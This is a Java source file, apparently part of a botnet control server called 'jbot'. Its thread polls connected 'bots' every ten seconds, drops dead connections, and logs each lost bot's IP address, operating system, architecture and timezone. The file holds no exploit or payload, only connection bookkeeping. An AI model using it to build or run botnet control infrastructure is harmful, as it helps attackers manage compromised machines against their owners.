package me.aaronakhtar.jbot.threads;

import me.aaronakhtar.jbot.Main;
import me.aaronakhtar.jbot.Utilities;
import me.aaronakhtar.jbot.objects.Bot;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class BotCheckerThread extends Thread {


    @Override
    public void run() {
        Utilities.sendInternalMessage("Started Bot Checker Successfully.");
        while(true){
            try {
                final List<Bot> offline = new ArrayList<>();
                for (Bot bot : Main.connectedBots){
                    if (!Utilities.isSocketAlive(new BufferedReader(new InputStreamReader(bot.getSocket().getInputStream())))){
                        offline.add(bot);
                        System.out.println(Utilities.Colour.RED.get() + "[*] " +Utilities.Colour.BRIGHT_RED.get() + "[Bot] " + Utilities.Colour.RESET.get() +
                                "{ "+bot.getSocket().getInetAddress().getHostAddress()+" | "+bot.getOperatingSystem()+" | "+bot.getArchitecture()+" | "+bot.getTimezone()+" }");
                    }
                }
                Main.connectedBots.removeAll(offline);
                Thread.sleep(10000);
                // check every 10 seconds
            }catch (Exception e){
                Utilities.handleException(e);
            }

        }
    }
}
